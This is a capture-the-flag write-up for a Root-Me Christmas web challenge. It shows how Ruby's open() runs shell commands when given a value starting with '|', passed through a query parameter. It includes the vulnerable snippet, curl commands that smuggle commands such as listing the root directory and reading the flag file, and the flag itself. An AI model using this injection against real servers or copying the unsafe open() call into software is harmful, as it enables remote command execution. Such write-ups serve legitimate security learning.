---
layout: Post
format: chall
title: Day 18 - Santa's sweet words
date: 2024-12-23
ctf: Root-Xmas
tags: [RCE, Ruby]
category: [Web]
---
# Day 18 - Santa's sweet words

<a class="back-link" href="../../">< Go back</a>

## Description

Santa has left you a few kind words for the end of the year ... you wouldn't do her any harm, would you?

The flag is at the root / of the server.

Author: Elweth

<https://day18.challenges.xmas.root-me.org>

[resources/app.rb](./resources/app.rb) was provided.

## Challenge

### Recon

We are given the source code which is only `app.rb`, from there I re-created the remote server structure to stress test a bit more locally.

The interesting bit is this `GET /api/message` request that takes a `number` parameter, and it's almost a direct LFI:

```rb
get '/api/message' do
  number = params[:number]

  file_name = "#{number}.txt"

  content = open(file_name, "rb") { |f| f.read }
```

After the usual LFI/RFI brute force attempts using LFImap, I ended up looking more in details about ruby and how the `open()` funtions works.

I found this [article](https://bishopfox.com/blog/ruby-vulnerabilities-exploits) that explains a potential vulnerability. The idea is that `open()` is a mess in ruby, and using the `|` character we can make it run arbitrary shell code.

Let's try a small PoC locally:

```bash
curl http://localhost:4567/api/message?number=|date>>3 # URL encoded: |date%3E%3E3
curl http://localhost:4567/api/message?number=3
# Lun 23 déc 2024 09:11:07 CET
```

Great! Let's move to the remote server.

### Exploit

Attempting the same PoC gives me:

```bash
curl "https://day18.challenges.xmas.root-me.org/api/message?number=3"
# Happy Holidays! May the magic of this season bring you comfort and joy.
# Take a moment to appreciate the little things, share laughter with those you cherish, and embrace the spirit of giving.
# Remember, the best gift is the love we share!
```

Ok... So the `3.txt` already existed, that could be the reason why it didn't override the contents of it, though that still seems odd, but even after trying with something like `10.txt` it still doesn't work,

My theory is that because this challenge doesn't go trough a private deploy, but instead is hosted, I suspect that the whole remote machine is read-only, to prevent funny people doing funny things :)

So from this knowledge, we have to find a way to RCE without a temporary files. Let's try something simpler:

```bash
curl http://localhost:4567/api/message?number=|ls
# <h1>Internal Server Error</h1>
```

Mhhh... I'm not sure why this happens, but after some trial and error I found that going trough `echo` makes it work fine:

```bash
curl http://localhost:4567/api/message?number=|echo $(ls)
# 1.txt 2.txt 3.txt 4.txt 5.txt app.rb public.txt
```

Great! Now, let's look at the root directory, where the flag supposedly is:

```bash
curl http://localhost:4567/api/message?number=|echo $(ls /)
# bin boot dev etc flag-ruby-expert.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var .txt
```

And finally let's cat the flag:

```bash
curl https://day18.challenges.xmas.root-me.org/api/message?number=|echo $(cat /flag-ruby-expert.txt)
# RM{Why_d0esn't_Open_Ju5t_Op3n_in_rUbY??}.txt
```
